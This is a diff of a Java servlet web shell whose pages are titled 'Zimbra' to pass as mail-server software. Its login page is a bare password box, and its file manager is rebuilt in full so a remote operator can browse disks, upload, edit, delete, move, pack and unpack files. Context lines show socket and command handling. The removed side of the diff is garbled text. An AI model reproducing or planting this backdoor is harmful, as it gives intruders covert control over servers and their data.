@@ -37,7 +37,7 @@
 	private static boolean ISLINUX = false;
 	
 	private static final String MODIFIED_ERROR = "out.";
-	private static final String BACK_HREF = " Back";
+	private static final String BACK_HREF = " <a href='javascript:history.back()'>Back</a>";
 	
 	private static class MyRequest extends HttpServletRequestWrapper {
 		public MyRequest(HttpServletRequest req) {
@@ -49,8 +49,7 @@
 				String value = super.getParameter(name);
 				if (name == null)
 					return null;
-				return new String(value.getBytes(REQUEST_CHARSET), PAG
-E_CHARSET);
+				return new String(value.getBytes(REQUEST_CHARSET), PAGE_CHARSET);
 			} catch (Exception e) {
 				return null;
 			}
@@ -137,8 +136,7 @@ E_CHARSET);
 								remoteSoc.close();
 							} catch (Exception ex) {
 							}
-							
-break;
+							break;
 						}
 					}
 				}
@@ -228,8 +226,7 @@ break;
 								|| eName.matches("[^/]+/$")) {
 							EnterFile ef = new EnterFile(eName.replaceAll("/",
 									""));
-			
-				handled.add(eName.replaceAll("/", ""));
+							handled.add(eName.replaceAll("/", ""));
 							ef.setEntry(entry);
 							list.add(ef);
 						} else {
@@ -316,8 +313,7 @@ break;
 			return false;
 		}
 
-		pub
-lic boolean canExecute() {
+		public boolean canExecute() {
 			return false;
 		}
 
@@ -381,13 +377,11 @@ lic boolean canExecute() {
 					int length = 0;
 					while ((length = in.read(buffer, 0, buffer.length)) > 0) {
 						String str = new String(buffer, 0, length);
-						str = str.replaceAll("&", "&").replaceAll("<",
-								"<").replaceAll(">", ">");
+						str = str.replaceAll("&", "&amp;").replaceAll("<",
+								"&lt;").replaceAll(">", "&gt;");
 						str = str.replaceAll("" + (char) 13 + (char) 10,
-								"
-");
-						str = str.replaceAll("\n", "
-");
+								"<br/>");
+						str = str.replaceAll("\n", "<br/>");
 						out.write(str.toCharArray(), 0, str.length());
 						out.flush();
 					}
@@ -407,8 +401,7 @@ lic boolean canExecute() {
 						out.flush();
 						this.ol.setCmd(null);
 					}
-				
-}
+				}
 			} catch (Exception e) {
 			}
 			try {
@@ -440,22 +433,25 @@ lic boolean canExecute() {
 		public String toString() {
 			StringBuffer html = new StringBuffer();
 			if (echoTableTag)
-				html.append("");
+				html.append("<table>");
 			for (int i = 0; i < rows.size(); i++) {
 				Row r = (Row) rows.get(i);
 				html
-						.append("");
+						.append("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
 				ArrayList columns = r.getColumns();
 				for (int a = 0; a < columns.size(); a++) {
 					Column c = (Column) columns.get(a);
-					html.append("");
+					html.append("<td nowrap>");
+					String vv = Util.htmlEncode(Util.getStr(c.getValue()));
+					if (vv.equals(""))
+						vv = "&nbsp;";
+					html.append(vv);
+					html.append("</td>");
 				}
-				html.append("");
+				html.append("</tr>");
 			}
 			if (echoTableTag)
-				html.append("
-"); String vv = Util.htmlEncode(Util.getStr(c.getValue())); if (vv.equals("")) vv = " "; html.append(vv); html.append("
-");
+				html.append("</table>");
 			return html.toString();
 		}
 	}
@@ -503,8 +499,7 @@ lic boolean canExecute() {
 				if (v > 1024) {
 					return getSize(size, 'G');
 				} else {
-					return v 
-+ "M";
+					return v + "M";
 				}
 			} else if (danwei == 'G') {
 				return formatNumber(size / 1024.0 / 1024.0 / 1024.0, 2) + "G";
@@ -560,8 +555,8 @@ lic boolean canExecute() {
 		public static String htmlEncode(String v) {
 			if (isEmpty(v))
 				return "";
-			return v.replaceAll("&", "&").replaceAll("<", "<")
-					.replaceAll(">", ">");
+			return v.replaceAll("&", "&amp;").replaceAll("<", "&lt;")
+					.replaceAll(">", "&gt;");
 		}
 
 		public static String getStr(String s) {
@@ -570,7 +565,7 @@ lic boolean canExecute() {
 
 		public static String null2Nbsp(String s) {
 			if (s == null)
-				s = " ";
+				s = "&nbsp;";
 			return s;
 		}
 
@@ -590,24 +585,23 @@ lic boolean canExecute() {
 			outMsg(out, msg, "center");
 		}
 
-		public 
-static void outMsg(Writer out, String msg, String align)
+		public static void outMsg(Writer out, String msg, String align)
 				throws Exception {
 			out
-					.write("
-"
+					.write("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:"
+							+ align
+							+ ";font-weight:bold;margin:10px\">"
 							+ msg
-							+ "
-");
+							+ "</div>");
 		}
 
 		public static String highLight(String str) {
 			str = str
 					.replaceAll(
 							"\\b(abstract|package|String|byte|static|synchronized|public|private|protected|void|int|long|double|boolean|float|char|final|extends|implements|throw|throws|native|class|interface|emum)\\b",
-							"$1");
+							"<span style='color:blue'>$1</span>");
 			str = str.replaceAll("\t(//.+)",
-					"\t$1");
+					"\t<span style='color:green'>$1</span>");
 			return str;
 		}
 	}
@@ -665,8 +659,7 @@ static void outMsg(Writer out, String msg, String align)
 				if (this.targetOutput != null)
 					out = this.targetOutput;
 				else
-					out = new FileOutputStream(new File(savePath, fileName))
-;
+					out = new FileOutputStream(new File(savePath, fileName));
 				int a = 0;
 				int k = 0;
 				String s = "";
@@ -732,8 +725,7 @@ static void outMsg(Writer out, String msg, String align)
 					session);
 			return;
 		} else {
-			((Invoker) ins.get("vLogin")).invoke
-(request, response,
+			((Invoker) ins.get("vLogin")).invoke(request, response,
 					session);
 			return;
 		}
@@ -771,7 +763,111 @@ static void outMsg(Writer out, String msg, String align)
 			try {
 				PrintWriter out = response.getWriter();
 				out
-						.println("");
+						.println("<script type=\"text/javascript\">"
+								+ "	String.prototype.trim = function(){return this.replace(/^\\s+|\\s+$/,'');};"
+								+ "	function fso(obj) {"
+								+ "		this.currentDir = '"
+								+ JSession.getAttribute(CURRENT_DIR)
+								+ "';"
+								+ "		this.filename = obj.filename;"
+								+ "		this.path = obj.path;"
+								+ "		this.filetype = obj.filetype;"
+								+ "		this.charset = obj.charset;"
+								+ "	};"
+								+ "	fso.prototype = {"
+								+ "		copy:function(){"
+								+ "			var path = prompt('Copy To : ',this.path);"
+								+ "			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"
+								+ "			doPost({o:'copy',src:this.path,to:path});"
+								+ "		},"
+								+ "		move:function() {"
+								+ "			var path =prompt('Move To : ',this.path);"
+								+ "			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"
+								+ "			doPost({o:'move',src:this.path,to:path})"
+								+ "		},"
+								+ "		vEdit:function() {"
+								+ "			if (!this.charset)"
+								+ "				doPost({o:'vEdit',filepath:this.path});"
+								+ "			else"
+								+ "				doPost({o:'vEdit',filepath:this.path,charset:this.charset});"
+								+ "		},"
+								+ "		down:function() {"
+								+ "			doPost({o:'down',path:this.path})"
+								+ "		},"
+								+ "		removedir:function() {"
+								+ "			if (!confirm('Dangerous ! Are You Sure To Delete '+this.filename+'?'))return;"
+								+ "			doPost({o:'removedir',dir:this.path});"
+								+ "		},"
+								+ "		mkdir:function() {"
+								+ "			var name = prompt('Input New Directory Name','');"
+								+ "			if (name == null || name.trim().length == 0)return;"
+								+ "			doPost({o:'mkdir',name:name});"
+								+ "		},"
+								+ "		subdir:function(out) {"
+								+ "			doPost({o:'filelist',folder:this.path,outentry:(out || 'none')})"
+								+ "		},"
+								+ "		parent:function() {"
+								+ "			var parent=(this.path.substr(0,this.path.lastIndexOf(\"/\")))+'/';"
+								+ "			doPost({o:'filelist',folder:parent})"
+								+ "		},"
+								+ "		createFile:function() {"
+								+ "			var path = prompt('Input New File Name','');"
+								+ "			if (path == null || path.trim().length == 0) return;"
+								+ "			doPost({o:'vCreateFile',filepath:path})"
+								+ "		},"
+								+ "		deleteBatch:function() {"
+								+ "			if (!confirm('Are You Sure To Delete These Files?')) return;"
+								+ "			var selected = new Array();"
+								+ "			var inputs = document.getElementsByTagName('input');"
+								+ "			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"
+								+ "			if (selected.length == 0) {alert('No File Selected');return;}"
+								+ "			doPost({o:'deleteBatch',files:selected.join(',')})"
+								+ "		},"
+								+ "		packBatch:function() {"
+								+ "			var selected = new Array();"
+								+ "			var inputs = document.getElementsByTagName('input');"
+								+ "			for (var i = 0;i<inputs.length;i++){if(inputs[i].checked){selected.push(inputs[i].value)}}"
+								+ "			if (selected.length == 0) {alert('No File Selected');return;}"
+								+ "			var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');"
+								+ "			if (savefilename == null || savefilename.trim().length == 0)return;"
+								+ "			doPost({o:'packBatch',files:selected.join(','),savefilename:savefilename})"
+								+ "		},"
+								+ "		pack:function(showconfig) {"
+								+ "			if (showconfig && confirm('Need Pack Configuration?')) {doPost({o:'vPack',packedfile:this.path});return;}"
+								+ "			var tmpName = '';"
+								+ "			if (this.filename.indexOf('.') == -1) tmpName = this.filename;"
+								+ "			else tmpName = this.filename.substr(0,this.filename.lastIndexOf('.'));"
+								+ "			tmpName += '.zip';"
+								+ "			var path = this.path;"
+								+ "			var name = prompt('Input Target File Name (Only Support Zip)',tmpName);"
+								+ "			if (name == null || path.trim().length == 0) return;"
+								+ "			doPost({o:'pack',packedfile:path,savefilename:name})"
+								+ "		},"
+								+ "		vEditProperty:function() {"
+								+ "			var path = this.path;"
+								+ "			doPost({o:'vEditProperty',filepath:path})"
+								+ "		},"
+								+ "		unpack:function() {"
+								+ "			var path = prompt('unpack to : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"
+								+ "			if (path == null || path.trim().length == 0) return;"
+								+ "			doPost({o:'unpack',savepath:path,zipfile:this.path})"
+								+ "		},"
+								+ "		enter:function() {"
+								+ "			doPost({o:'enter',filepath:this.path})"
+								+ "		}"
+								+ "	};"
+								+ "	function doPost(obj) {"
+								+ "		var form = document.forms[\"doForm\"];"
+								+ "		var elements = form.elements;for (var i = form.length - 1;i>=0;i--){form.removeChild(elements[i])}"
+								+ "		for (var pro in obj)"
+								+ "		{"
+								+ "			var input = document.createElement(\"input\");"
+								+ "			input.type = \"hidden\";"
+								+ "			input.name = pro;"
+								+ "			input.value = obj[pro];"
+								+ "			form.appendChild(input);"
+								+ "		}"
+								+ "		form.submit();" + "	}" + "</script>");
 
 			} catch (Exception e) {
 
@@ -780,15 +876,32 @@ static void outMsg(Writer out, String msg, String align)
 		}
 	}
 
-	private static class BeforeInvoker extends D
-efaultInvoker {
+	private static class BeforeInvoker extends DefaultInvoker {
 		public void invoke(HttpServletRequest request,
 				HttpServletResponse response, HttpSession JSession)
 				throws Exception {
 			try {
 				PrintWriter out = response.getWriter();
 				out
-						.println("");
+						.println("<html><head><title>Zimbra</title><style type=\"text/css\">"
+								+ "body,td{font: 12px Arial,Tahoma;line-height: 16px;}"
+								+ ".input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}"
+								+ ".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}"
+								+ ".bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}"
+								+ "a {color: #00f;text-decoration:underline;}"
+								+ "a:hover{color: #f00;text-decoration:none;}"
+								+ ".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}"
+								+ ".alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}"
+								+ ".focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}"
+								+ ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}"
+								+ ".head td span{font-weight:normal;}"
+								+ "form{margin:0;padding:0;}"
+								+ "h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}"
+								+ "ul.info li{margin:0;color:#444;line-height:24px;height:24px;}"
+								+ "u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}"
+								+ ".secho{height:400px;width:100%;overflow:auto;border:none}"
+								+ "hr{border: 1px solid rgb(221, 221, 221); height: 0px;}"
+								+ "</style></head><body style=\"margin:0;table-layout:fixed; word-break:break-all\">");
 			} catch (Exception e) {
 
 				throw e;
@@ -798,12 +911,11 @@ efaultInvoker {
 
 	private static class AfterInvoker extends DefaultInvoker {
 		public void invoke(HttpServletRequest request,
-				HttpServl
-etResponse response, HttpSession JSession)
+				HttpServletResponse response, HttpSession JSession)
 				throws Exception {
 			try {
 				PrintWriter out = response.getWriter();
-				out.println("");
+				out.println("</body></html>");
 			} catch (Exception e) {
 
 				throw e;
@@ -844,9 +956,9 @@ etResponse response, HttpSession JSession)
 						.setAttribute(
 								MSG,
 								success
-										+ " Files Deleted Success , "
+										+ " Files Deleted <span style='color:green'>Success</span> , "
 										+ failed
-										+ " Files Deleted Failed!");
+										+ " Files Deleted <span style='color:red'>Failed</span>!");
 				response.sendRedirect(SHELL_NAME);
 			} catch (Exception e) {
 
@@ -866,23 +978,19 @@ etResponse response, HttpSession JSession)
 			try {
 				PrintWriter out = response.getWriter();
 				out
-						.println("
-"
-								+ ""
-								+ "	  
-"
-								+ "        
-\"login\"
-"
-								+ "        
-"
-								+ "        
-\"
-
-"
-								+ ""
-								+ "    
-");
+						.println("<html><head><title>zimbra</title><style type=\"text/css\">"
+								+ "	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}"
+								+ "a{font:11px Verdana;BACKGROUND: #FFFFFF;}"
+								+ "	</style></head><body><form method=\"POST\" action=\""
+								+ SHELL_NAME
+								+ "\">"
+								+ "<!--<p style=\"font:11px Verdana;color:red\">Private Edition Dont Share It !</p>-->"
+								+ "	  <p><span style=\"font:11px Verdana;\"></span>"
+								+ "        <input name=\"o\" type=\"hidden\" value=\"login\">"
+								+ "        <input name=\"pw\" type=\"password\" size=\"20\" style=\"border:0;\">"
+								+ "        <input type=\"submit\" value=\"  \" style=\"border:0;\" ><br/>"
+								+ "<!--<span style=\"font:11px Verdana;\"> </span>--></p>"
+								+ "    </form><span style='font-weight:bold;color:red;font-size:12px'></span></body></html>");
 			} catch (Exception e) {
 
 				throw e;
@@ -937,8 +1045,7 @@ etResponse response, HttpSession JSession)
 					return;
 				} else {
 					JSession.setAttribute(PW_SESSION_ATTRIBUTE, mdPw);
-					re
-sponse.sendRedirect(SHELL_NAME);
+					response.sendRedirect(SHELL_NAME);
 					return;
 				}
 			} catch (Exception e) {
@@ -1010,13 +1117,11 @@ sponse.sendRedirect(SHELL_NAME);
 				}
 				path2View = Util.convertPath(path);
 				if (!file.exists()) {
-					throw new Exception(path + "Dont 
-Exists !");
+					throw new Exception(path + "Dont Exists !");
 				}
 				File[] list = file.listFiles();
 				Arrays.sort(list, new MyComparator());
-				out.println("
-");
+				out.println("<div style='margin:10px'>");
 				String cr = null;
 				try {
 					cr = JSession.getAttribute(CURRENT_DIR).toString()
@@ -1025,41 +1130,69 @@ Exists !");
 					cr = "/";
 				}
 				File currentRoot = new File(cr);
-				out.println("
-File Manager - Current disk ""
+				out.println("<h2>File Manager - Current disk &quot;"
 						+ (cr.indexOf("/") == 0 ? "/" : currentRoot.getPath())
-						+ "" total (unknow)
-");
+						+ "&quot; total (unknow)</h2>");
 				out
-						.println("
-"
-								+ ""
-								+ "  "
-								+ "    "
-								+ "	"
-								+ "    "
-								+ "  " + "
-Current Directory 
-\"filelist\"/
-\""
-\"GO\"
-" + "
-");
+						.println("<form action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\">"
+								+ "<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"
+								+ "  <tr>"
+								+ "    <td nowrap>Current Directory  <input type=\"hidden\" name=\"o\" value=\"filelist\"/></td>"
+								+ "	<td width=\"98%\"><input class=\"input\" name=\"folder\" value=\""
+								+ path2View
+								+ "\" type=\"text\" style=\"width:100%;margin:0 8px;\"></td>"
+								+ "    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"></td>"
+								+ "  </tr>" + "</table>" + "</form>");
 				out
-						.println(""
-								+ "" + ""
-						+ ""
-						+ "  "
-						+ "  "
-						+ "  "
-						+ "  "
-						+ "  " + "");
+						.println("<table width=\"98%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">"
+								+ "<form action=\""
+								+ SHELL_NAME
+								+ "?o=upload\" method=\"POST\" enctype=\"multipart/form-data\"><tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;\">"
+								+ "<div style=\"float:right;\"><input class=\"input\" name=\"file\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"Upload\" "
+								+ (enter == null ? "type=\"submit\""
+										: "type=\"button\" onclick=\"alert('You Are In File Now ! Can Not Upload !')\"")
+								+ " /></div>"
+								+ "<a href=\"javascript:new fso({path:'"
+								+ Util.convertPath(WEB_ROOT)
+								+ "'}).subdir('true')\">Web Root</a>"
+								+ " | <a href=\"javascript:new fso({path:'"
+								+ Util.convertPath(SHELL_DIR)
+								+ "'}).subdir('true')\">Shell Directory</a>"
+								+ " | <a href=\"javascript:"
+								+ (enter == null ? "new fso({}).mkdir()"
+										: "alert('You Are In File Now ! Can Not Create Directory ! ')")
+								+ "\">New Directory</a> | <a href=\"javascript:"
+								+ (enter == null ? "new fso({}).createFile()"
+										: "alert('You Are In File Now ! Can Not Create File !')")
+								+ "\">New File</a>" + " | ");
+				File[] roots = file.listRoots();
+				for (int i = 0; i < roots.length; i++) {
+					File r = roots[i];
+					out.println("<a href=\"javascript:new fso({path:'"
+							+ Util.convertPath(r.getPath())
+							+ "'}).subdir('true');\">Disk("
+							+ Util.convertPath(r.getPath()) + ")</a>");
+					if (i != roots.length - 1) {
+						out.println("|");
+					}
+				}
+				out.println("</td>" + "</tr></form>"
+						+ "<tr class=\"head\"><td>&nbsp;</td>"
+						+ "  <td>Name</td>"
+						+ "  <td width=\"16%\">Last Modified</td>"
+						+ "  <td width=\"10%\">Size</td>"
+						+ "  <td width=\"20%\">Read/Write/Execute</td>"
+						+ "  <td width=\"22%\">&nbsp;</td>" + "</tr>");
 				if (file.getParent() != null) {
 					out
-							.println(""
-									+ ""
-									+ ""
-									+ "");
+							.println("<tr class=alt1>"
+									+ "<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"
+									+ "<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"
+									+ Util.convertPath(file.getAbsolutePath())
+									+ "'}).parent()\">Goto Parent</a></td>"
+									+ "</tr>");
 				}
 				int dircount = 0;
 				int filecount = 0;
@@ -1068,45 +1201,130 @@ Current Directory
 					if (f.isDirectory()) {
 						dircount++;
 						out
-								.println(""
-										+ ""
-										+ ""
-										+ ""
-										+ ""
-							
-			+ ""
-										+ "");
+								.println("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt2';\">"
+										+ "<td width=\"2%\" nowrap><font face=\"wingdings\" size=\"3\">0</font></td>"
+										+ "<td><a href=\"javascript:new fso({path:'"
+										+ Util.convertPath(f.getAbsolutePath())
+										+ "'}).subdir()\">"
+										+ f.getName()
+										+ "</a></td>"
+										+ "<td nowrap>"
+										+ Util.formatDate(f.lastModified())
+										+ "</td>"
+										+ "<td nowrap>--</td>"
+										+ "<td nowrap>"
+										+ f.canRead()
+										+ " / "
+										+ f.canWrite()
+										+ " / unknow</td>"
+										+ "<td nowrap>");
+						if (enter != null)
+							out.println("&nbsp;");
+						else
+							out
+									.println("<a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "',filename:'"
+											+ f.getName()
+											+ "'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "',filename:'"
+											+ f.getName()
+											+ "'}).pack(true)\">Pack</a>");
+						out.println("</td></tr>");
 					} else {
 						filecount++;
 						out
-								.println(""
+								.println("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">"
+										+ "<td width=\"2%\" nowrap><input type='checkbox' value='"
+										+ f.getName()
+										+ "'/></td>"
+										+ "<td><a href=\"javascript:new fso({path:'"
+										+ Util.convertPath(f.getAbsolutePath())
+										+ "'}).down()\">"
+										+ f.getName()
+										+ "</a></td>"
+										+ "<td nowrap>"
+										+ Util.formatDate(f.lastModified())
+										+ "</td>"
+										+ "<td nowrap>"
+										+ Util.getSize(f.length(), 'B')
+										+ "</td>"
+										+ "<td nowrap>"
 										+ ""
-										+ ""
-										+ ""
-										+ ""
-										+ ""
-										+ "");
+										+ f.canRead()
+										+ " / "
+										+ f.canWrite()
+										+ " / unknow </td>"
+										+ "<td nowrap>"
+										+ "<a href=\"javascript:new fso({path:'"
+										+ Util.convertPath(f.getAbsolutePath())
+										+ "'}).vEdit()\">Edit</a> | "
+										+ "<a href=\"javascript:new fso({path:'"
+										+ Util.convertPath(f.getAbsolutePath())
+										+ "'}).down()\">Down</a> | "
+										+ "<a href=\"javascript:new fso({path:'"
+										+ Util.convertPath(f.getAbsolutePath())
+										+ "'}).copy()\">Copy</a>");
+						if (enter == null) {
+							out
+									.println(" | <a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "'}).move()\">Move</a> | "
+											+ "<a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "'}).vEditProperty()\">Property</a> | "
+											+ "<a href=\"javascript:new fso({path:'"
+											+ Util.convertPath(f
+													.getAbsolutePath())
+											+ "'}).enter()\">Enter</a>");
+							if (f.getName().endsWith(".zip")
+									|| f.getName().endsWith(".jar")) {
+								out
+										.println(" | <a href=\"javascript:new fso({path:'"
+												+ Util.convertPath(f
+														.getAbsolutePath())
+												+ "',filename:'"
+												+ f.getName()
+												+ "'}).unpack()\">UnPack</a>");
+							} else if (f.getName().endsWith(".rar")) {
+								out
+										.println(" | <a href=\"javascript:alert('Dont Support RAR,Please Use WINRAR');\">UnPack</a>");
+							} else {
+								out
+										.println(" | <a href=\"javascript:new fso({path:'"
+												+ Util.convertPath(f
+														.getAbsolutePath())
+												+ "',filename:'"
+												+ f.getName()
+												+ "'}).pack()\">Pack</a>");
+							}
+						}
+						out.println("</td></tr>");
 					}
 				}
 				out
-						.println(""
-								+ "  " + "  " + "
-" + "
-\"\"
- 
-\"Upload\"
-" + "Web Root" + " | Shell Directory" + " | New Directory | New File" + " | "); File[] roots = file.listRoots(); for (int i = 0; i < roots.length; i++) { File r = roots[i]; out.println("Disk(" + Util.convertPath(r.getPath()) + ")"); if (i != roots.length - 1) { out.println("|"); } } out.println("
- 	Name	Last Modified	Size	Read/Write/Execute	 
-=	Goto Parent
-0	" + f.getName() + "	" + Util.formatDate(f.lastModified()) + "	--	" + f.canRead() + " / " + f.canWrite() + " / unknow	"); if (enter != null) out.println(" "); else out .println("Del | Move | Pack"); out.println("
-	" + f.getName() + "	" + Util.formatDate(f.lastModified()) + "	" + Util.getSize(f.length(), 'B') + "	" + "" + f.canRead() + " / " + f.canWrite() + " / unknow	" + "Edit | " + "Down | " + "Copy"); if (enter = = null) { out .println(" | Move | " + "Property | " + "Enter"); if (f.getName().endsWith(".zip") || f.getName().endsWith(".jar")) { out .println(" | UnPack"); } else if (f.getName().endsWith(".rar")) { out .println(" | UnPack"); } else { out .println(" | Pack"); } } out.println("
- 	"); if (enter != null) out .println("Pack Selected - Delete Selected"); else out .println("Pack Selected - Delete Selected"); out.println("	" + dircount + " directories / " + filecount + " files
-");
-				out.println("
-");
+						.println("<tr class=\"alt2\"><td align=\"center\">&nbsp;</td>"
+								+ "  <td>");
+				if (enter != null)
+					out
+							.println("<a href=\"javascript:alert('You Are In File Now ! Can Not Pack !');\">Pack Selected</a> - <a href=\"javascript:alert('You Are In File Now ! Can Not Delete !');\">Delete Selected</a>");
+				else
+					out
+							.println("<a href=\"javascript:new fso({}).packBatch();\">Pack Selected</a> - <a href=\"javascript:new fso({}).deleteBatch();\">Delete Selected</a>");
+				out.println("</td>" + "  <td colspan=\"4\" align=\"right\">"
+						+ dircount + " directories / " + filecount
+						+ " files</td></tr>" + "</table>");
+				out.println("</div>");
 				if (file instanceof EnterFile)
-				
-	((EnterFile) file).close();
+					((EnterFile) file).close();
 			} catch (ZipException e) {
 				JSession.setAttribute(MSG, "\""
 						+ JSession.getAttribute(ENTER).toString()
@@ -1180,12 +1398,11 @@ Current Directory
 				if (f.exists() && f.length() > 0)
 					JSession
 							.setAttribute(MSG,
-									"Upload File Success!");
+									"<span style='color:green'>Upload File Success!</span>");
 				else
 					JSession
-							.setAttr
-ibute("MSG",
-									"Upload File Failed!");
+							.setAttribute("MSG",
+									"<span style='color:red'>Upload File Failed!</span>");
 				response.sendRedirect(SHELL_NAME);
 			} catch (Exception e) {
 				throw e;
@@ -1245,10 +1462,8 @@ ibute("MSG",
 				response
 						.getWriter()
 						.println(
-								"
-"
-										+ "
-");
+								"<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">"
+										+ "</div>");
 			} catch (Exception e) {
 
 				throw e;
@@ -1262,8 +1477,7 @@ ibute("MSG",
 				throws Exception {
 			try {
 				PrintWriter out = response.getWriter();
-				String path = request.ge
-tParameter("filepath");
+				String path = request.getParameter("filepath");
 				File f = new File(path);
 				if (!f.isAbsolute()) {
 					String oldPath = path;
@@ -1277,26 +1491,19 @@ tParameter("filepath");
 					f.createNewFile();
 				}
 				out
-						.println("
-" + "
-" + "
-Create / Edit File »
-" + "" + "
-Current File (import new file name and new file)
-\""
-" + " 
-
-" + "
-File Content
-
-" + "
-\"Submit\"
- 
-\"Back\"
-
-" + "
-" + "
-");
+						.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
+								+ "<form name=\"form1\" id=\"form1\" action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" >"
+								+ "<h2>Create / Edit File &raquo;</h2>"
+								+ "<input type='hidden' name='o' value='createFile'>"
+								+ "<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""
+								+ path
+								+ "\" type=\"text\" size=\"100\"  />"
+								+ " <select name='charset' class='input'><option value='ANSI'>ANSI</option><option value='UTF-8'>UTF-8</option></select></p>"
+								+ "<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" ></textarea></p>"
+								+ "<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"></p>"
+								+ "</form>" + "</td></tr></table>");
 			} catch (Exception e) {
 
 				throw e;
@@ -1320,8 +1527,7 @@ File Content
 					input = zf.getInputStream(entry);
 				} else {
 					File f = new File(path);
-					if (!f.ex
-ists())
+					if (!f.exists())
 						return;
 					input = new FileInputStream(path);
 				}
@@ -1340,32 +1546,33 @@ ists())
 				}
 				reader.close();
 				out
-						.println("
-" + "
-" + "
-Create / Edit File »
-" + "" + "
-Current File (import new file name and new file)
-\""
-" + " 
-
-" + "
-File Content
-"
+						.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
+								+ "<form name=\"form1\" id=\"form1\" action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" >"
+								+ "<h2>Create / Edit File &raquo;</h2>"
+								+ "<input type='hidden' name='o' value='createFile'>"
+								+ "<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""
+								+ path
+								+ "\" type=\"text\" size=\"100\"  />"
+								+ " <select name='charset' id='fcharset' onchange=\"new fso({path:'"
+								+ path
+								+ "',charset:document.getElementById('fcharset').value}).vEdit()\" class='input'><option value='ANSI'>ANSI</option><option "
+								+ ((!Util.isEmpty(charset) && charset
+										.equals("UTF-8")) ? "selected" : "")
+								+ " value='UTF-8'>UTF-8</option></select></p>"
+								+ "<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" >"
 								+ Util.htmlEncode(content.toString())
-								+ "
-
-" + "
-"); if (enter != null) out .println("
-\"Submit\"
-"); else out .println("
-\"Submit\"
-"); out .println("
-\"Back\"
-
-" + "
-" + "
-");
+								+ "</textarea></p>" + "<p>");
+				if (enter != null)
+					out
+							.println("<input class=\"bt\" name=\"submit\" id=\"submit\" onclick=\"alert('You Are In File Now ! Can Not Save !')\" type=\"button\" value=\"Submit\">");
+				else
+					out
+							.println("<input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\">");
+				out
+						.println("<input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"></p>"
+								+ "</form>" + "</td></tr></table>");
 
 			} catch (Exception e) {
 
@@ -1402,10 +1609,10 @@ File Content
 				JSession
 						.setAttribute(
 								MSG,
-								"Save File "
+								"Save File <span style='color:green'>"
 										+ (new File(path)).getName()
-										+ " With "
-										+ charset + " Success!");
+										+ "</span> With <span style='font-weight:bold;color:red'>"
+										+ charset + "</span> Success!");
 				response.sendRedirect(SHELL_NAME);
 			} catch (Exception e) {
 
@@ -1430,44 +1637,52 @@ File Content
 				cal.setTimeInMillis(f.lastModified());
 
 				out
-						.println("
-" + "
-" + "
-Set File Property »
-" + "
-Current File (FullPath)
-\""
-
-" + "
-\"editProperty\"
- " + "
-" + " 
-Read " + " 
-Write " + "
-
-" + "
-Instead »" + "year:" + "
-								+ cal.get(Calendar.YEAR)								+ 
-" + "month:" + "
-								+ (cal.get(Calendar.MONTH) + 1)								+ 
-" + "day:" + "
-								+ cal.get(Calendar.DATE)								+ 
